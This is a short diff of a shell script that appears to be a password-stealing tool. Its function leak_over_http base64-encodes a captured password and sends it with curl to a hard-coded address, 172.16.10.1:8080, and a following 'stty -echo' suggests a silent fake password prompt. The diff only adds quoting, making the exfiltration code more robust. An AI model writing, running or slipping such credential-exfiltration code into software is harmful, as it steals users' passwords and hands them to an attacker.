@@ -3,8 +3,8 @@ ARGS="$@"
 
 leak_over_http() {
     local encoded_password
-    encoded_password=$(echo ${1} | base64 | sed s'/[=+/]//'g)
-    curl http://172.16.10.1:8080/${encoded_password}
+    encoded_password=$(echo "${1}" | base64 | sed s'/[=+/]//'g)
+    curl "http://172.16.10.1:8080/${encoded_password}"
 }
 
 stty -echo
